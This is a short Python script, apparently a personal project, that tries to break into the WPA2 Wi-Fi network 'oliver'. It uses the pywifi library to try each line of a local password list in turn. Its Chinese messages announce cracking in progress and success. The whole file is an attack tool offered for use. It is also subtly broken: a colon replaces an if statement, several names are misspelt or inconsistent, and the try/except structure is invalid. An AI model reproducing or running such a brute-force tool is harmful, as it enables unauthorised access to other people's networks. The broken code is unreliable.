# -*- coding: utf-8 -*-
"""
Created on Fri Oct 23 11:00:44 2020

@author: 15025
"""

import pywifi
from pywifi import const
import time


def wifiConnect(pwd):
    wifi = pywifi.interface()[0]
    ifaces.disconnect()
    time.sleep(1)
    wifistatus = const.IFACE_DISCONNECTED:
        profile=pywifi.Prifile()
        profile.ssid = "oliver"
        profile.auth = const.AUTH_ALG_OPEN
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        profile.cipher = const.CIPHER_TYPE_CCMP
        profile.key=pwd
        ifaces.remove_all_network_profiles()
        tep_profile=ifaces.add_network_profile(profile)
        ifaces.connect(tep_profile)
        timw.sleep(3)
        if ifaces.status() == const.IFACE_CONNECTED:
            return True
        else:
            prinit("已有wifi连接")
        
def readPassword():
    print("开始破解")
    path = "C:/Users/15025/Desktop/password.txt"
    file = open(path, "r")
    while True:
        try:
            pad = file.readline()
            bool = wifiConnect(pad)
            if bool:
                print("密码已破解", pad)
                print("WIfi以自动连接！！!")
                break
            else:
                print("密码破解中...密码校对", pad)
            except:
                continue
            
readPassword()
        